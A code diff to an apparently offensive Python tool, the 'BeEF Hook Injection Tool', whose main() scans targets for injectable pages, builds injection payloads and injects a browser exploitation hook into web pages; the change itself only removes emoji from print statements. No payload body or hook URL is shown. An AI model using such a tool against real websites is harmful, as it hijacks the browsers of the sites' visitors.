@@ -20,7 +20,7 @@ def main():
     
     args = parser.parse_args()
     
-    print("🐮 BeEF Hook Injection Tool")
+    print("BeEF Hook Injection Tool")
     print("=" * 40)
     
     injector = BeEFInjector(args.hook_url)
@@ -31,7 +31,7 @@ def main():
     print()
     
     if args.scan_only:
-        print("🔍 Scanning for injection points...")
+        print("Scanning for injection points...")
         injectable_pages = injector.scan_for_injectable_pages(args.target)
         
         print(f"\nFound {len(injectable_pages)} injectable pages:")
@@ -39,7 +39,7 @@ def main():
             print(f"  {i}. {page['url']} ({page['type']})")
             
         if injectable_pages:
-            print(f"\n💡 Use these URLs for injection:")
+            print(f"\nUse these URLs for injection:")
             for page in injectable_pages:
                 payload = injector.create_injection_payload(page['url'], args.payload_type)
                 print(f"  URL: {page['url']}")
@@ -47,7 +47,7 @@ def main():
                 print()
     
     elif args.test:
-        print("🧪 Testing injection...")
+        print("Testing injection...")
         payload = injector.create_injection_payload(args.target, args.payload_type)
         result = injector.test_injection(args.target, payload['payload'])
         
@@ -56,7 +56,7 @@ def main():
             print(f"Error: {result['error']}")
     
     else:
-        print("🚀 Injecting BeEF hook...")
+        print("Injecting BeEF hook...")
         results = inject_beef_hook(args.target)
         
         print(f"\nInjection Results:")
@@ -69,7 +69,7 @@ def main():
             if result['status'] == 'success':
                 print(f"    Size change: {result['original_size']} -> {result['modified_size']} bytes")
         
-        print(f"\n📋 Generated Payloads:")
+        print(f"\nGenerated Payloads:")
         for payload in results['payloads']:
             print(f"  URL: {payload['target_url']}")
             print(f"  Type: {payload['payload_type']}")
